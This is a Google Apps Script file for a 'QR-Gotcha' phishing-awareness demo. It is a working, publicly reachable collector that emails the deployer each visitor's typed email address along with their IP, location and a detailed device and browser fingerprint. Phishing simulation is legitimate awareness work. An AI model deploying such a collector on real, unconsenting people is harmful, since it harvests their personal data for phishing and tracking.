/**
 * QR-Gotcha collector — emails each capture straight to you. No spreadsheet.
 *
 * SETUP (one time, ~2 minutes):
 *   1. Go to script.google.com → New project.
 *   2. Delete the sample code, paste this whole file in.
 *   3. (Optional) set NOTIFY_EMAIL below. Left blank, it emails the Google
 *      account you deploy under.
 *   4. Deploy → New deployment → type "Web app":
 *        - Execute as: Me
 *        - Who has access: Anyone
 *      Authorise it when prompted (it asks for permission to send email as you).
 *   5. Copy the Web app URL (ends in /exec) and paste it into index.html
 *      (SCRIPT_URL) and admin.html (SCRIPT_URL).
 *
 * Every time someone submits, you get an email. Nothing is stored anywhere.
 */

var NOTIFY_EMAIL = '';   // leave blank to send to the account that owns this script

function doPost(e) {
  try {
    var d = JSON.parse((e && e.postData && e.postData.contents) || '{}');
    var c = d.client || {};
    var to = NOTIFY_EMAIL || Session.getEffectiveUser().getEmail();
    var email = String(d.email || '(none entered)').slice(0, 254);
    var ip  = d.ip  || c.ip  || '';
    var geo = d.geo || c.geo || '';

    var body = [
      'A new QR-Gotcha capture came in at ' + new Date().toLocaleString() + '.',
      '',
      'Email entered:  ' + email,
      'IP address:     ' + ip,
      'Location:       ' + geo,
      'Device:         ' + (c.device || ''),
      'Operating sys:  ' + (c.os || ''),
      'Browser:        ' + (c.browser || ''),
      'Screen:         ' + (c.screen || ''),
      'Language:       ' + (c.lang || ''),
      'Time zone:      ' + (c.tz || ''),
      'Platform:       ' + (c.platform || ''),
      'User agent:     ' + (c.ua || ''),
      '',
      '— Sent by your QR-Gotcha awareness demo.'
    ].join('\n');

    MailApp.sendEmail(to, 'QR-Gotcha capture: ' + email, body);
    return ContentService.createTextOutput(JSON.stringify({ ok: true }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({ ok: false, error: String(err) }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Visiting the /exec URL in a browser just shows this (handy for a quick check).
function doGet() {
  return ContentService.createTextOutput('QR-Gotcha collector is running.')
    .setMimeType(ContentService.MimeType.TEXT);
}
